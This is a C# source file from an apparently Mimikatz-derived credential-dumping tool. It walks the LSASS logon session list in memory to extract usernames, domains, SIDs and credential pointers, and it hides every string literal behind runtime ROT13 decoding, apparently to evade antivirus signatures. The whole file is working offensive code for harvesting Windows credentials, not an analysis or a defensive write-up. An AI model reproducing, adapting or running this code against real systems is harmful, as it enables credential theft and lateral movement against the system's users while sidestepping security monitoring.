//start
using System.Text;
using System.Linq;
using System;
﻿using ldump_rot13.Credential;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using FILETIME = System.Runtime.InteropServices.ComTypes.FILETIME;
using static ldump_rot13.Win32.Natives;

namespace ldump_rot13.Module
{
    class LogonSessions
    {

        static long max_search_size = 580000;

        static string[] KUHL_M_SEKURLSA_LOGON_TYPE = {
            new string("HaqrsvarqYbtbaGlcr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()),
            new string("Haxabja !".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()),
            new string("Vagrenpgvir".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()),
            new string("Argjbex".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()),
            new string("Ongpu".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()),
            new string("Freivpr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()),
            new string("Cebkl".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()),
            new string("Haybpx".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()),
            new string("ArgjbexPyrnegrkg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()),
            new string("ArjPerqragvnyf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()),
            new string("ErzbgrVagrenpgvir".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()),
            new string("PnpurqVagrenpgvir".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()),
            new string("PnpurqErzbgrVagrenpgvir".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()),
            new string("PnpurqHaybpx".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())
        };

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_BASIC_SECURITY_LOGON_SESSION_DATA
        {
            public IntPtr LogonId; //PLUID
            public string UserName; //PNatives.UNICODE_STRING
            public string LogonDomain; //PNatives.UNICODE_STRING
            public int LogonType;
            public int Session;
            public IntPtr pCredentials;
            public IntPtr pSid; //PSID
            public IntPtr pCredentialManager;
            public FILETIME LogonTime;
            public string LogonServer; //PNatives.UNICODE_STRING
        }

        public static int FindCredentials(IntPtr hLsass, IntPtr lsasrvMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {

            uint logonSessionListSignOffset;
            int logonSessionListCount; //*DWORD

            logonSessionListSignOffset = (uint)Utility.OffsetFromSign(new string("yfnfei.qyy".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), oshelper.logonSessionListSign, max_search_size);
            if (logonSessionListSignOffset == 0)
            {
                Console.WriteLine(new string("[k] Reebe: Pbhyq abg svaq YbtbaFrffvbaYvfg fvtangher\a".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                return 1;
            }
            //Console.WriteLine("[*] LogonSessionList offset found as {0}", logonSessionListSignOffset);

            logonSessionListCount = Utility.GetInt(hLsass, lsasrvMem, logonSessionListSignOffset, oshelper.LOGONSESSIONSLISTCOUNTOFFSET);

            //Console.WriteLine("[*] LogSessList found at address {0:X}", logonSessionListAddr.ToInt64());
            //Console.WriteLine("[*] LogSessListCount {0}", logonSessionListCount);

            IntPtr current = IntPtr.Zero;

            for (int i = 0; i < logonSessionListCount; i++)
            {
                //Console.WriteLine(new string("[!] ybtbaFrffvbaYvfgPbhag:".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())+ logonSessionListCount + new string(" -> Fgrc  : ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()) + i);

                current = Utility.GetIntPtr(hLsass, lsasrvMem, logonSessionListSignOffset, oshelper.LOGONSESSIONLISTOFFSET + (8 * i));
                IntPtr pList = current;

                do
                {
                    byte[] listentryBytes = Utility.ReadFromLsass(ref hLsass, current, oshelper.ListTypeSize);

                    GCHandle pinnedArray = GCHandle.Alloc(listentryBytes, GCHandleType.Pinned);
                    IntPtr listentry = pinnedArray.AddrOfPinnedObject();

                    KIWI_BASIC_SECURITY_LOGON_SESSION_DATA logonsession = new KIWI_BASIC_SECURITY_LOGON_SESSION_DATA
                    {
                        LogonId = IntPtr.Add(listentry, oshelper.LocallyUniqueIdentifierOffset),
                        LogonType = Marshal.ReadInt32(IntPtr.Add(listentry, oshelper.LogonTypeOffset)),//slistentry.LogonType,
                        Session = Marshal.ReadInt32(IntPtr.Add(listentry, oshelper.SessionOffset)),//slistentry.Session
                        pCredentials = new IntPtr(Marshal.ReadInt64(IntPtr.Add(listentry, oshelper.CredentialsOffset))),//slistentry.Credentials,
                        pCredentialManager = new IntPtr(Marshal.ReadInt64(IntPtr.Add(listentry, oshelper.CredentialManagerOffset))),
                        pSid = IntPtr.Add(listentry, oshelper.pSidOffset),
                        LogonTime = Utility.ReadStruct<FILETIME>(IntPtr.Add(listentry, oshelper.LogonTimeOffset + 4))
                    };

                    LUID luid = Utility.ReadStruct<LUID>(logonsession.LogonId);

                    IntPtr pUserName = IntPtr.Add(current, oshelper.UserNameListOffset);
                    IntPtr pLogonDomain = IntPtr.Add(current, oshelper.DomaineOffset);
                    IntPtr pLogonServer = IntPtr.Add(current, oshelper.LogonServerOffset);

                    logonsession.UserName = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pUserName));
                    logonsession.LogonDomain = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pLogonDomain));
                    logonsession.LogonServer = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pLogonServer));

                    ConvertSidToStringSid(Utility.ExtractSid(hLsass, logonsession.pSid), out string stringSid);

                    Logon logon = new Logon(luid)
                    {
                        Session = logonsession.Session,
                        LogonType = KUHL_M_SEKURLSA_LOGON_TYPE[logonsession.LogonType],
                        LogonTime = logonsession.LogonTime,
                        UserName = logonsession.UserName,
                        LogonDomain = logonsession.LogonDomain,
                        LogonServer = logonsession.LogonServer,
                        SID = stringSid,
                        pCredentials = logonsession.pCredentials,
                        pCredentialManager = logonsession.pCredentialManager
                    };
                    logonlist.Add(logon);

                    current = new IntPtr(Marshal.ReadInt64(listentry));

                    pinnedArray.Free();
                } while (current != pList);
            }
            return 0;
        }
    }
}
